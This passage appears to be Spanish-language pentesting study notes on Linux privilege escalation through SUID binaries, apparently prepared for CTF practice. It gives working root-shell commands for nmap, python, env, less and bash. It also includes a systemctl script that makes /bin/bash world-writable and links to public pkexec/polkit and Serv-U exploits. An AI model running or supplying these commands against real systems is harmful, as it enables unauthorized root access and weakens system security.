
### Permisos SUID y GUID 
#### Permiso de SUID en nmap
basta con lanzar nmap de forma interactiva
```bash
nmap --interactive
```

y luego lanzar
```bash
!bash -p
```
#### Permiso de SUID pkexec
se puede utilizar el siguiente exploit, cuando pkexec tiene permisos SUID
[pkexec](https://github.com/Almorabea/pkexec-exploit/blob/main/CVE-2021-4034.py)

al compartirlo con la máquina y darle permisos de ejecución, nos preguntará si queremos usar el payload por defecto, escribimos **n** y aceptamos.

#### Permiso de SUID Python
```bash
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

#### Permiso de SUID polkit
Cuando detectamos algun binario con nombre similar a **polkit** , se puede explotar con un exploit.

https://github.com/Almorabea/Polkit-exploit

#### Permiso de SUID env
```bash
/usr/bin/env /bin/sh -p
```

#### Permiso SUID Less
Leemos un fichero:
```bash
sudo /bin/less fichero.txt

Luego nos aparece resaltado el (END)
ahí escribimos una exclamación !
y podemos ejecutar comandos del sistema desde less, pero como tenemos permiso SUID podemos ejecutar:
/bin/bash

y ya somos root
```

#### Permiso SUID Systemctl
al ejecutar este script, estamos dando permiso SUID a "/bin/bash".
```bash
#!/bin/bash 
TF=$(mktemp).service 
echo '[Service] 
Type=oneshot 
ExecStart=/bin/sh -c "chmod 777 /bin/bash" 
[Install] 
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

Luego ejecutamos una bash y seremos root.
```bash
bash -p
```

#### Serv-U
Servidor FTP con vulnerabilidad de escalada de privilegios
link al exploit: https://www.exploit-db.com/exploits/47009

Crear un fichero llamado *privesc.c* y pegar el contenido del exploit
lanzar 
```bash
gcc privesc.c -o pe && ./pe
```

#### Permiso SUID en /opt
En este directorio se suelen almacenar scripts y programas que no pertenecen al sistema. Cuando encontramos un binario SUID, o con sudo -L dentro de este directorio hay que investigarlo bien. Para el ejemplo, en la máquina **symfonos 1** , se encontró **/opt/statuscheck**, pertenecía a root, y tenía SUID, esto quiere decir que podíamos ejecutarlo y además como root. 

al hacer un **strings** se vió que contenía el comado **curl** y estaba incluido con ruta relativa y no absoluta, lo que ayudó a acontecer un [Path Hijacking](https://glmbxecurity.github.io/docs/5-hacking-linux/path-hijacking/)

